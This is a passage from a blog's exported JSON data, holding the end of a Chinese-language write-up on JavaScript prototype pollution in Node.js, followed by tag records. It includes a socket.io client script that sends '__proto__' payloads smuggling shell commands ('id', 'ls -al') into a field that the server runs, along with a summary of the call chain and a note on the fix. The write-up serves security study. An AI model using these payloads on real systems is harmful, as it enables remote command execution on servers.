error:'</span>)<br>  <span class=\"hljs-built_in\">console</span>.log(err)<br>&#125;)<br><br>socket.on(<span class=\"hljs-string\">'message'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">msg</span>) </span>&#123;<br>  <span class=\"hljs-built_in\">console</span>.log(msg.from,<span class=\"hljs-string\">\"[\"</span>, msg.channel!==<span class=\"hljs-literal\">undefined</span>?msg.channel:<span class=\"hljs-string\">'Default'</span>,<span class=\"hljs-string\">\"]\"</span>, <span class=\"hljs-string\">\"says:\\n\"</span>, msg.message);<br>&#125;);<br><br>socket.emit(<span class=\"hljs-string\">'register'</span>, <span class=\"hljs-string\">`&#123;\"name\":\"xxx\", \"__proto__\":&#123;\"country\":\"xxx';id;echo 'xxx\"&#125;&#125;`</span>);<br>socket.emit(<span class=\"hljs-string\">'message'</span>, <span class=\"hljs-built_in\">JSON</span>.stringify(&#123; <span class=\"hljs-attr\">msg</span>: <span class=\"hljs-string\">\"hello\"</span> &#125;));<br>socket.emit(<span class=\"hljs-string\">'register'</span>, <span class=\"hljs-string\">`&#123;\"name\":\"xxx\", \"__proto__\":&#123;\"country\":\"xxx';ls -al;echo 'xxx\"&#125;&#125;`</span>);<br></code></pre></td></tr></table></figure>\n\n<p>访问触发：</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/15.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"15\"></p>\n<p>我们总结一下整个调用链：</p>\n<figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">1</span>、客户端传入触发服务端 <span class=\"hljs-function\"><span class=\"hljs-title\">register</span> 事件时的待解析的数据，包含原型的数据 ------&gt;</span><br><span class=\"hljs-number\">2</span>、客户端触发服务端 <span class=\"hljs-function\"><span class=\"hljs-title\">register</span> 事件，传入数据被 JSON.parse() 方法解析后传入 clone 方法,由于__proto__ 是普通属性，可以将 country 的值赋给返回的对象 ------&gt;</span><br><span class=\"hljs-number\">3</span>、返回一个具有 <span class=\"hljs-function\"><span class=\"hljs-title\">country</span> 属性的对象，值就是我们传入的值，拼接调用 getAscii 方法，执行命令 ------&gt;</span><br><span class=\"hljs-number\">4</span>、服务端返回执行命令的消息给客户端，攻击达成<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"5-总结\"><a href=\"#5-总结\" class=\"headerlink\" title=\"5@ 总结\"></a>5@ 总结</h1><p>利用一定的函数特征可以检测出一部分的 api 是否具有潜在的 prototype_pollution 的风险，这里是一位国外学者分析的<a href=\"https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf\" target=\"_blank\" rel=\"noopener\">结果</a>。</p>\n<p>其实这种攻击的防御是比较容易的，合并或者给对象属性赋值之前，检查键名是否为 <code>__proto__</code> 等敏感词即可。</p>\n<p>Reference:</p>\n<p><code>https://segmentfault.com/a/1190000008338987</code></p>\n<p><code>https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</code></p>\n<p><code>https://juejin.im/entry/58dfbe0361ff4b006b16638</code></p>\n<p><code>https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more</code></p>\n<p><code>https://stackoverflow.com/questions/8453887/why-is-it-necessary-to-set-the-prototype-constructor</code></p>\n<p><code>https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf</code></p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ckbh7yzg40000mp7g6ypqt1pl","tag_id":"ckbh7yzgf0004mp7g605ws7pa","_id":"ckbh7yzgu000emp7gcmlesb56"},{"post_id":"ckbh7yzg40000mp7g6ypqt1pl","tag_id":"ckbh7yzgm0009mp7g0fzvkljz","_id":"ckbh7yzgv000fmp7gplqv0s2b"},{"post_id":"ckbh7yzg40000mp7g6ypqt1pl","tag_id":"ckbh7yzgs000cmp7gtiirwxmm","_id":"ckbh7yzgw000hmp7g5pjs20u2"},{"post_id":"ckbh7yzgb0002mp7gqogn2zz2","tag_id":"ckbh7yzgt000dmp7gvm8q1kcj","_id":"ckbh7yzgx000jmp7g6hjtcjfq"},{"post_id":"ckbh7yzgb0002mp7gqogn2zz2","tag_id":"ckbh7yzgv000gmp7gxr86goii","_id":"ckbh7yzgx000kmp7gnzilg011"},{"post_id":"ckbh7yzgh0005mp7gipx67ivl","tag_id":"ckbh7yzgw000imp7g5raahtni","_id":"ckbh7yzgz000nmp7g6zdbedit"},{"post_id":"ckbh7yzgh0005mp7gipx67ivl","tag_id":"ckbh7yzgx000lmp7gqo3ch5nf","_id":"ckbh7yzh0000omp7g9zveexsr"},{"post_id":"ckbh7yzgj0007mp7gdkhqt744","tag_id":"ckbh7yzgw000imp7g5raahtni","_id":"ckbh7yzh1000rmp7gf2hrpa9u"},{"post_id":"ckbh7yzgj0007mp7gdkhqt744","tag_id":"ckbh7yzgx000lmp7gqo3ch5nf","_id":"ckbh7yzh2000smp7gfp5ztjjl"},{"post_id":"ckbh7yzgl0008mp7gjb68skun","tag_id":"ckbh7yzh1000qmp7g4x7twhzh","_id":"ckbh7yzh4000vmp7gfh16zkd2"},{"post_id":"ckbh7yzgl0008mp7gjb68skun","tag_id":"ckbh7yzh2000tmp7gcwrgkcfg","_id":"ckbh7yzh4000wmp7gv3tmmlco"},{"post_id":"ckbh7yzgo000amp7g4rt84vwv","tag_id":"ckbh7yzh3000ump7gb0clic3k","_id":"ckbh7yzh5000ymp7gy3nq9k9e"},{"post_id":"ckbh7yzgo000amp7g4rt84vwv","tag_id":"ckbh7yzgm0009mp7g0fzvkljz","_id":"ckbh7yzh5000zmp7gn7mh723x"},{"post_id":"ckbh7yzgp000bmp7gzmblrt8s","tag_id":"ckbh7yzh3000ump7gb0clic3k","_id":"ckbh7yzh60011mp7gwvtw6m7y"},{"post_id":"ckbh7yzgp000bmp7gzmblrt8s","tag_id":"ckbh7yzgm0009mp7g0fzvkljz","_id":"ckbh7yzh70012mp7gbvurgxtj"},{"post_id":"ckbh7yzgp000bmp7gzmblrt8s","tag_id":"ckbh7yzh50010mp7gxgw0o0vy","_id":"ckbh7yzhc0013mp7gvfajtnid"}],"Tag":[{"name":"xss","_id":"ckbh7yzgf0004mp7g605ws7pa"},{"name":"javascript","_id":"ckbh7yzgm0009mp7g0fzvkljz"},{"name":"tips","_id":"ckbh7yzgs000cmp7gtiirwxmm"},{"name":"deepin","_id":"ckbh7yzgt000dmp7gvm8q1kcj"},{"name":"环境","_id":"ckbh7yzgv000gmp7gxr86goii"},{"name":"代码审计","_id":"ckbh7yzgw000imp7g5raahtni"},{"name":"php","_id":"ckbh7yzgx000lmp7gqo3ch5nf"},{"name":"ntfs","_id":"ckbh7yzh1000qmp7g4x7twhzh"},{"name":"方法","_id":"ckbh7yzh2000tmp7gcwrgkcfg"},{"name":"vulneralbility","_id":"ckbh7yzh3000ump7gb0clic3k"},{"name":"[object Object]","_id":"ckbh7yzh50010mp7gxgw0o0vy"}]}}